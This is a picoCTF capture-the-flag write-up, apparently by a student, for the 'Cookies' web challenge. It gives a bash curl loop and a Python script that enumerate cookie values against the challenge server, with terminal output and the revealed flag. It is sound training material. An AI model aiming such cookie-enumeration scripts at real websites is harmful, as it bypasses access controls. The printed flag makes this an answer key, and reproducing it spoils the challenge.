## Descripcion
Who doesn't love cookies? Try to figure out the best one.

http://wily-courier.picoctf.net:52899/

## solucion 
```
┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$ for i in {1..20}; do curl -s http://wily-courier.picoctf.net:52899/check -H "Cookie: name=$i" | grep "picoCTF"; done





            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}

┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$



















solucion 2
script de python
import requests

# La URL de tu reto de picoCTF
url = "http://wily-courier.picoctf.net:55009/check"

print("Iniciando la búsqueda de la flag...")

# Aumentamos el rango hasta el 30
for i in range(1, 30):
    # Configuramos la cookie
    cookies = {'name': str(i)}
    
    try:
        # Esto te mostrará en pantalla qué número está intentando
        print(f"[*] Probando cookie name={i}...") 
        
        # Hacemos la petición HTTP GET
        response = requests.get(url, cookies=cookies)
        
        # Filtramos la respuesta buscando la flag
        if "picoCTF" in response.text:
            print(f"\n[+] ¡Éxito! Flag encontrada con la cookie name={i}")
            
            # Buscamos la línea exacta para imprimirla limpia
            for line in response.text.split('\n'):
                if "picoCTF" in line:
                    print(f"Flag: {line.strip()}")
            
            # Detenemos el ciclo
            break 
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Error de conexión en el intento {i}: {e}")

print("\nBúsqueda finalizada.")

┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$ python3 wea.py
Iniciando la búsqueda de la flag...
[*] Probando cookie name=1...
[*] Probando cookie name=2...
[*] Probando cookie name=3...
[*] Probando cookie name=4...
[*] Probando cookie name=5...
[*] Probando cookie name=6...
[*] Probando cookie name=7...
[*] Probando cookie name=8...
[*] Probando cookie name=9...
[*] Probando cookie name=10...
[*] Probando cookie name=11...
[*] Probando cookie name=12...
[*] Probando cookie name=13...
[*] Probando cookie name=14...
[*] Probando cookie name=15...
[*] Probando cookie name=16...
[*] Probando cookie name=17...
[*] Probando cookie name=18...

[+] ¡Éxito! Flag encontrada con la cookie name=18
Flag: <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}

Búsqueda finalizada.

┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
```

```
picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
```
## notas adicionales


## referencias
